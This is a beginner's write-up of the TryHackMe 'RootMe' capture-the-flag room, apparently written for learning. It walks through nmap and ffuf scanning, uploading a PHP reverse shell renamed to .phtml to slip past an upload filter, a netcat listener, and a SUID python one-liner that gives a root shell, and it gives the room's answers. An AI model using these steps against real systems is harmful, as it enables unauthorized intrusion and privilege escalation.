# RootMe Write-up | 报告
<details>
  <summary>Click to view in Chinese (点击查看中文版)</summary>

---



  </details>

---

This is my write-up for the [RootMe](https://tryhackme.com/room/rrootme) room. 

# Overview

This room is about basic reconnaissance and exploitation. It contains simple tasks first, but at the exploitation phase it gets a little more difficult, we need to get reverse shell and elevate our priviliges. 

# Reconnaissance

We got four questions here:

1. **"Scan the machine, how many ports are open?"**;

2. **"What version of Apache is running?"**;

3. **"What service is running on port 22?"**;

**"Find directories on the web server using the GoBuster tool."**; (not necessarily GoBuster)

4. **"What is the hidden directory?"**.

After getting machine IP, we can scan it to search for open ports using Nmap:

> Nmap (Network Mapper) is a free, open-source network scanning tool used for host discovery, port scanning, service detection, operating system fingerprinting, and security auditing.

```
nmap -sC -sV machine_ip
```
Make sure to use `-sV` command for service version detection, because in one of the tasks we have to write the version of the Apache running.

We got two open ports: 22 (ssh) and 80 (http). Apache version is 2.4.41 . Now let's find the hidden directory using ffuf tool, not GoBuster.

 > ffuf is generally considered better than Gobuster for complex web fuzzing due to its flexibility and advanced filtering capabilities.  While both tools are fast and written in Go, ffuf utilizes a FUZZ keyword that can be placed anywhere in an HTTP request (URL, headers, body, parameters), whereas Gobuster is primarily designed for appending paths to URLs.

```
ffuf -u http://machine_ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

And I found the "panel" directory.

## Summary:

**..how many ports are open?"** - 2

**"What version of Apache is running?"** - 2.4.41

**"What service is running on port 22?"** - ssh

**"What is the hidden directory?"** - `/panel/`

# Exploitation
## Getting a shell

**"Find a form to upload and get a reverse shell, and find the flag (user.txt)."**

We found hidden directory `/panel/`, lets check it: `http://machine_ip/panel`

Here we can upload a file, so now we need to find a form to get a reverse shell. 

I browsed internet for "reverse shell php" and found this form from [pentestmonkey](https://github.com/pentestmonkey): https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Download the "php-reverse-shell.php" file and take a look at its code.

We have two fields that we need to change: `$ip` & `$port`

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
```

Open your terminal, run `ip a` to get your IP address, copy it and paste to the `$ip` field. About `$port` - you don't really have to change it.

After that, go to `http://machine_ip/panel` page again, and press "Browse..." button to upload the php file, then press "Upload".

We're getting "PHP não é permitido!" error message, which means "PHP is not allowed!". So we need to bypass it by changing the file format. Change file's format to `.phtml`, it is almost the same as `.php `. This trick often used in CTFs to bypass blocking of PHP files. Now try to upload the file again.

And it's done, we see "O arquivo foi upado com sucesso!", which means "The file was successfully uploaded!", and below it we need to press the "Veja!" button, which means "Look!".

We'll see "WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) " error page, to make it work and get a reverse shell we also need to set up the connection with netcat tool. Run this command in your terminal:

> Netcat (often abbreviated as nc) is a versatile command-line utility designed to read and write data across network connections using TCP or UDP protocols. A netcat reverse shell allows a target system to connect back to an attacker's machine, bypassing inbound firewall restrictions by initiating an outbound connection.
```
nc -lvp 1234
```
> The `-l` flag puts Netcat in listen mode to accept incoming connections, the `-v` flag enables verbose output to show connection details, and the `-p` flag specifies the local port to listen on.

And while its running, reload the page and watch to your terminal.

Now we're in, you can check it by running `whoami` command. You'll be `www-data`.

We need to find `user.txt` flag, so I ran this command:
```
find / -type f -name "user.txt" 2>/dev/null
```
> Use `2>/dev/null` at the end of a command to not to see all error messages.

I got `/var/www/user.txt` output. Let's read it with `cat`:
```
cat /var/www/user.txt
```
And it reveals the first flag.

## Privilege Escalation
1. **"Search for files with SUID permission, which file is weird?"**

**"Find a form to escalate your privileges."**

2. **(And find) "root.txt"**

Let's search for files with SUID permission:
> What exactly is SUID? It is a setting that ensures a program runs with the privileges of a specific user, regardless of who actually executes it. So if the program have a SUID permission and it is owned by root, anyone can execute it.

I ran this command:
```
find / -type f -perm -4000
```
> `-perm -4000` is a flag to search for files only with SUID permission.

And I got a lot of output. The "/usr/bin/python2.7" file is the most dangerous here, it means that anyone can execute a python file. Any python file. This is our way to elevate privileges. We need to find the python form for this. Here's useful site: [GTFObins](https://gtfobins.org/)
> GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.

Find "python", then click "shell" > "SUID". You'll see this command:
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
Run it in the shell that we got. Then run `whoami` to check if it worked. You need to be root now.

Then just we did with `user.txt`, we need to search for `root.txt`:
```
find / -type f -name "root.txt" 2>/dev/null
```
And the `root.txt` flag is in `/root/root.txt` path. Read it with `cat`.

## Lessons Learned

This challenge is perfect for pentest beginners. It teaches you how to recon using Nmap, getting a shell with a form and elevate privileges with form. The form parts was the most interesting as for me. Also I learned a new thing about `.php` files, that you can bypass `.php` filter just by changing the format of the file to `.phtml`.
